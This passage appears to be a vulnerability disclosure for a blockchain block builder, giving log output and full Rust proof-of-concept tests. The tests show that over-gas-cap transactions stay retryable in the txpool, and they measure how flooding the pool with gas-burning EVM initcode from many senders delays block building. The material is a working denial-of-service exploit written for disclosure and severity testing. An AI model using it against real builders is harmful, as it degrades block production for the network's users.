2026-05-01T19:13:44.707218Z DEBUG payload_builder: Considering transaction tx_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc tx_da_size=100 result=max gas usage exceeded
2026-05-01T19:13:45.287403Z  INFO poc_post_execution_gas_cap_retry: built block while over-cap tx was available round=3 block_hash=0xbf4c2298e45003eb561ca248cca31c5894360d27874df431060085d12393cc5b over_cap_hash=0x0dade53359ee6c0be84fb40aaa3130f8ab976b0e1da477e5fc1eb2bd1437a8bc control_hash=0x478c0de7b9be13a85b432789e37ca8e0e37c16700a486803fc213514cd275e74 over_cap_status=Some(Pending) over_cap_history=Some([Pending]) rejection_cached=false
```

### PoC source (full)

```rust
#![allow(missing_docs)]

use core::time::Duration;
use std::{env, time::Instant};

use alloy_primitives::{Bytes, TxHash};
use base_builder_core::{
    BuilderConfig,
    test_utils::{
        ChainDriverExt, ONE_ETH, TransactionBuilderExt, TransactionPoolObserver,
        setup_test_instance_with_builder_config,
    },
};
use reth_transaction_pool::TransactionEvent;
use tokio::time::sleep;
use tracing::info;

fn env_usize(name: &str, default: usize) -> usize {
    env::var(name).ok().and_then(|v| v.parse::<usize>().ok()).unwrap_or(default)
}

fn env_u64(name: &str, default: u64) -> u64 {
    env::var(name).ok().and_then(|v| v.parse::<u64>().ok()).unwrap_or(default)
}

fn env_bool(name: &str, default: bool) -> bool {
    env::var(name)
        .ok()
        .map(|v| matches!(v.as_str(), "1" | "true" | "TRUE" | "yes" | "YES"))
        .unwrap_or(default)
}

async fn wait_for_pool_event(
    pool: &TransactionPoolObserver,
    tx_hash: TxHash,
    description: &str,
    predicate: impl Fn(Option<TransactionEvent>) -> bool,
) -> Option<TransactionEvent> {
    for _ in 0..80 {
        let status = pool.tx_status(tx_hash);
        if predicate(status.clone()) {
            return status;
        }
        sleep(Duration::from_millis(50)).await;
    }

    panic!(
        "timed out waiting for tx {tx_hash} to satisfy pool condition: {description}; \
         last_status={:?}; full_history={:?}",
        pool.tx_status(tx_hash),
        pool.history(tx_hash),
    );
}

/// CREATE initcode that burns gas in a deterministic EVM loop before returning
/// zero-length runtime code.
///
/// loop:
///   counter = loops
///   while counter != 0 { sha3(0, 0); counter -= 1 }
///   return(0, 0)
///
/// This is valid public-user transaction input. The builder selects it from the
/// real txpool, executes it in the real EVM, rejects it after `gas_used` exceeds
/// the configured cap, and then incorrectly leaves it retryable.
fn gas_burner_create_initcode(loops: u16) -> Bytes {
    const LOOP_PC: u8 = 3;
    const END_PC: u8 = 21;

    let mut code = Vec::with_capacity(28);
    code.extend_from_slice(&[0x61, (loops >> 8) as u8, loops as u8]); // PUSH2 loops
    code.push(0x5b); // JUMPDEST loop
    code.extend_from_slice(&[
        0x80, // DUP1
        0x15, // ISZERO
        0x60, END_PC, // PUSH1 end
        0x57, // JUMPI
        0x60, 0x00, // PUSH1 0
        0x60, 0x00, // PUSH1 0
        0x20, // SHA3(0, 0)
        0x50, // POP hash
        0x60, 0x01, // PUSH1 1
        0x03, // SUB, counter -= 1
        0x60, LOOP_PC, // PUSH1 loop
        0x56, // JUMP
        0x5b, // JUMPDEST end
        0x50, // POP counter
        0x60, 0x00, // PUSH1 0
        0x60, 0x00, // PUSH1 0
        0xf3, // RETURN(0, 0)
    ]);
    debug_assert_eq!(code.len(), 28);
    Bytes::from(code)
}

/// Minimal correctness PoC.
///
/// Expected vulnerable behavior:
/// - a valid public tx enters the real txpool;
/// - the builder fully executes it and rejects it only after post-execution
///   `gas_used > max_gas_per_txn`;
/// - the tx is excluded from every produced block;
/// - normal control txs from another sender are still included;
/// - the excluded over-cap tx remains Pending/Queued in the real txpool;
/// - it is not present in the shared rejection cache;
/// - repeated `payload_builder` logs for the same hash show repeated post-EVM
///   `result="max gas usage exceeded"` events.
#[tokio::test(flavor = "multi_thread")]
async fn poc_over_cap_tx_survives_and_is_retried_across_blocks() -> eyre::Result<()> {
    let config = BuilderConfig::for_tests().with_max_gas_per_txn(Some(25_000));
    let rbuilder = setup_test_instance_with_builder_config(config).await?;
    let driver = rbuilder.driver().await?;

    // Use a separate control account. This prevents the deliberately over-cap
    // tx from nonce-blocking the normal transaction that proves block production
    // continues while the attack tx remains retryable.
    let mut control_accounts = driver.fund_accounts(1, ONE_ETH).await?;
    let control_signer = control_accounts.pop().expect("funded account should exist");

    let over_cap_tx = driver
        .create_transaction()
        .random_big_transaction() // repository helper: approximately 86,220 EVM gas
        .with_max_priority_fee_per_gas(1_000_000_000)
        .send()
        .await
        .expect("failed to send over-cap transaction");
    let over_cap_hash = *over_cap_tx.tx_hash();

    println!("POC_OVER_CAP_TX_HASH={over_cap_hash}");

    let initial_status = wait_for_pool_event(
        rbuilder.pool(),
        over_cap_hash,
        "over-cap tx should enter the real txpool",
        |status| matches!(status, Some(TransactionEvent::Pending) | Some(TransactionEvent::Queued)),
    )
    .await;

    assert!(
        !rbuilder.builder_config().rejection_cache.contains_key(&over_cap_hash),
        "precondition failed: over-cap tx should not start in the rejection cache"
    );

    info!(?over_cap_hash, ?initial_status, "over-cap tx entered txpool");
    println!("POC_INITIAL_STATUS={initial_status:?}");

    let mut built_blocks = Vec::new();

    for round in 1..=3_u64 {
        let control_tx = driver
            .create_transaction()
            .random_valid_transfer()
            .with_signer(&control_signer)
            .with_max_priority_fee_per_gas(1)
            .send()
            .await
            .expect("failed to send control transaction");
        let control_hash = *control_tx.tx_hash();

        wait_for_pool_event(
            rbuilder.pool(),
            control_hash,
            "control tx should enter the real txpool",
            |status| matches!(status, Some(TransactionEvent::Pending) | Some(TransactionEvent::Queued)),
        )
        .await;

        let block = driver.build_new_block_with_current_timestamp(None).await?;
        let block_hash = block.header.hash;
        let block_txs = block.transactions.hashes().collect::<Vec<_>>();
        let over_cap_included = block_txs.contains(&over_cap_hash);
        let control_included = block_txs.contains(&control_hash);

        // Give the txpool observer a short window to record mined/discarded events.
        sleep(Duration::from_millis(250)).await;
        let over_cap_status = rbuilder.pool().tx_status(over_cap_hash);
        let over_cap_history = rbuilder.pool().history(over_cap_hash);
        let over_cap_pool_exists = rbuilder.pool().exists(over_cap_hash);
        let rejection_cached = rbuilder.builder_config().rejection_cache.contains_key(&over_cap_hash);

        println!(
            "POC_ROUND={round} BLOCK_HASH={block_hash} CONTROL_TX={control_hash} \
             CONTROL_INCLUDED={control_included} OVER_CAP_INCLUDED={over_cap_included} \
             OVER_CAP_STATUS={over_cap_status:?} OVER_CAP_POOL_EXISTS={over_cap_pool_exists} \
             REJECTION_CACHED={rejection_cached} OVER_CAP_HISTORY={over_cap_history:?}"
        );

        info!(
            round,
            ?block_hash,
            ?over_cap_hash,
            ?control_hash,
            ?over_cap_status,
            ?over_cap_history,
            rejection_cached,
            "built block while over-cap tx was available"
        );

        assert!(
            control_included,
            "round {round}: normal control tx {control_hash} should be included; block_txs={block_txs:?}"
        );
        assert!(
            !over_cap_included,
            "round {round}: over-cap tx {over_cap_hash} must be excluded by max_gas_per_txn"
        );
        assert!(
            over_cap_pool_exists,
            "round {round}: vulnerable code keeps the excluded over-cap tx physically present in the real txpool; \
             fixed code should remove or rejection-cache it; status={over_cap_status:?}, history={over_cap_history:?}"
        );
        assert!(
            matches!(over_cap_status, Some(TransactionEvent::Pending) | Some(TransactionEvent::Queued)),
            "round {round}: over-cap tx should have been evicted/rejection-cached after the first full execution; \
             instead status={over_cap_status:?}, history={over_cap_history:?}"
        );
        assert!(
            !rejection_cached,
            "round {round}: vulnerable code leaves the over-cap tx outside the rejection cache"
        );
        assert!(
            !matches!(
                over_cap_status,
                Some(TransactionEvent::Mined(_))
                    | Some(TransactionEvent::Discarded)
                    | Some(TransactionEvent::Invalid)
            ),
            "round {round}: over-cap tx should not be mined/discarded/invalid in the observed pool history"
        );

        built_blocks.push(block_hash);
    }

    assert_eq!(built_blocks.len(), 3, "PoC should build three successive blocks");
    println!("POC_RESULT=vulnerable_behavior_confirmed built_blocks={built_blocks:?}");
    Ok(())
}

/// Scaled impact benchmark.
///
/// This is ignored by default because it is host-size dependent. It is the mode
/// to run before making a High-severity claim. It compares clean block-build
/// wall-clock time with block-build wall-clock time while the txpool contains
/// many high-priority over-cap transactions from distinct funded senders.

#[tokio::test(flavor = "multi_thread")]
#[ignore = "scaled timing benchmark; run manually with --ignored"]
async fn poc_over_cap_txpool_pressure_delays_payload_build() -> eyre::Result<()> {
    let sender_count = env_usize("AZUL_POC_SENDERS", 256);
    let rounds = env_usize("AZUL_POC_ROUNDS", 3);
    let gas_cap = env_u64("AZUL_POC_GAS_CAP", 500_000);
    let tx_gas_limit = env_u64("AZUL_POC_TX_GAS_LIMIT", 8_000_000);
    let burn_loops = env_u64("AZUL_POC_BURN_LOOPS", 45_000).min(u16::MAX as u64) as u16;
    let high_assert = env_bool("AZUL_POC_HIGH_ASSERT", false);

    assert!(sender_count > 0, "AZUL_POC_SENDERS must be positive");
    assert!(rounds > 0, "AZUL_POC_ROUNDS must be positive");
    assert!(tx_gas_limit > gas_cap, "tx gas limit must exceed configured gas cap");

    println!(
        "POC_TIMING_CONFIG sender_count={sender_count} rounds={rounds} gas_cap={gas_cap} \
         tx_gas_limit={tx_gas_limit} burn_loops={burn_loops} high_assert={high_assert}"
    );

    let config = BuilderConfig::for_tests()
        .with_max_gas_per_txn(Some(gas_cap))
        .with_block_time_ms(1_000)
        .with_flashblocks_leeway_time_ms(0);

    let rbuilder = setup_test_instance_with_builder_config(config).await?;
    let driver = rbuilder.driver().await?.with_gas_limit(10_000_000);

    // Warm up the builder and measure a clean block through the same Engine API path.
    let _ = driver.build_new_block_with_current_timestamp(None).await?;
    let baseline_start = Instant::now();
    let clean_block = driver.build_new_block_with_current_timestamp(None).await?;
    let baseline_ms = baseline_start.elapsed().as_millis() as f64;
    println!(
        "POC_TIMING_BASELINE clean_block_number={} clean_block_ms={baseline_ms:.3}",
        clean_block.header.number
    );

    let signers = driver.fund_accounts(sender_count, ONE_ETH).await?;
    let input = gas_burner_create_initcode(burn_loops);
    let mut attack_hashes: Vec<TxHash> = Vec::with_capacity(signers.len());

    for (idx, signer) in signers.iter().enumerate() {
        let pending = driver
            .create_transaction()
            .with_signer(signer)
            .with_create()
            .with_input(input.clone())
            .with_gas_limit(tx_gas_limit)
            .with_max_priority_fee_per_gas(1_000_000_000 + idx as u128)
            .send()
            .await?;

        let hash = *pending.tx_hash();
        attack_hashes.push(hash);
        if idx < 8 || idx + 1 == signers.len() {
            println!("POC_TIMING_SUBMITTED idx={idx} tx_hash={hash:?}");
        }
    }

    for tx_hash in &attack_hashes {
        wait_for_pool_event(
            rbuilder.pool(),
            *tx_hash,
            "attack tx should enter the real txpool",
            |status| matches!(status, Some(TransactionEvent::Pending) | Some(TransactionEvent::Queued)),
        )
        .await;
    }

    let initially_visible = attack_hashes.iter().filter(|hash| rbuilder.pool().exists(**hash)).count();
    println!(
        "POC_TIMING_POOL_AFTER_SUBMIT submitted={} visible_in_pool={initially_visible}",
        attack_hashes.len()
    );
    assert_eq!(initially_visible, attack_hashes.len(), "all attack txs must be visible in the real txpool");

    let mut attack_ms = Vec::with_capacity(rounds);

    for round in 1..=rounds {
        let start = Instant::now();
        let block = driver.build_new_block_with_current_timestamp(None).await?;
        let elapsed_ms = start.elapsed().as_millis() as f64;
        attack_ms.push(elapsed_ms);

        let block_txs = block.transactions.hashes().collect::<Vec<_>>();
        let included = attack_hashes.iter().filter(|hash| block_txs.contains(*hash)).count();
        sleep(Duration::from_millis(250)).await;
        let still_in_pool = attack_hashes.iter().filter(|hash| rbuilder.pool().exists(**hash)).count();
        let rejection_cached = attack_hashes
            .iter()
            .filter(|hash| rbuilder.builder_config().rejection_cache.contains_key(*hash))
            .count();

        println!(
            "POC_TIMING_ROUND round={round} block_number={} build_ms={elapsed_ms:.3} \
             attack_txs={} included={included} still_in_pool={still_in_pool} rejection_cached={rejection_cached}",
            block.header.number,
            attack_hashes.len()
        );

        for hash in attack_hashes.iter().take(5) {
            println!(
                "POC_TIMING_HISTORY round={round} tx_hash={hash:?} history={:?}",
                rbuilder.pool().history(*hash)
            );
        }

        assert_eq!(included, 0, "over-cap attacker txs must be excluded from the produced block");
        assert_eq!(still_in_pool, attack_hashes.len(), "excluded over-cap txs remain retryable");
        assert_eq!(rejection_cached, 0, "over-cap txs are not rejection-cached on vulnerable code");
    }

    let attack_avg_ms = attack_ms.iter().sum::<f64>() / attack_ms.len() as f64;
    let ratio = attack_avg_ms / baseline_ms.max(1.0);
    let high_threshold_met = ratio >= 5.0;

    println!(
        "POC_TIMING_RESULT baseline_avg_ms={baseline_ms:.3} attack_avg_ms={attack_avg_ms:.3} \
         ratio={ratio:.3} high_threshold_met={high_threshold_met} repeated_tx_count={} rounds={rounds}",
        attack_hashes.len()
    );

    if high_assert {
        assert!(
            high_threshold_met,
            "High timing threshold not met on this host: ratio={ratio:.3}. The retry/eviction bug is proven, \
             but severity should remain Medium unless the run demonstrates >=500% one-block delay. Increase \
             AZUL_POC_SENDERS/AZUL_POC_BURN_LOOPS or run on the target-sized authorized builder host."
        );
    }

    Ok(())
}
```
